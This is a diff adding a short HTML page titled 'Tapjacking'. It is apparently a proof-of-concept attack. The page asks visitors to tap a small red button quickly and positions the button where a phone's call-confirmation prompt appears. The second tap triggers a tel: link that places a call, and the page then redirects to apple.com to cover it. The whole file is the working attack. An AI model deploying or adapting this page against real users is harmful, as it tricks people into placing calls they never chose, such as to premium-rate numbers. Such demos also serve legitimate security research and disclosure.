@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tapjacking</title>
+    <style>
+        .call-button {
+            position: fixed;
+            bottom: 280px;
+            left: 75%;
+            transform: translateX(-50%);
+            background-color: red;
+            width: 20px;
+            height: 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>Click the red button as fast as you can</h1>
+    <button class="call-button" id="callBtn"></button>
+
+    <script>
+        let clickCount = 0;
+        document.getElementById("callBtn").addEventListener("click", function() {
+            clickCount++;
+            if (clickCount === 2) {
+                window.location.href = "tel:123456789";
+
+                setTimeout(() => {
+                    window.location.href = "https://www.apple.com";
+                }, 2000); // Redirects after 2 seconds
+            }
+        });
+    </script>
+
+</body>
+</html>
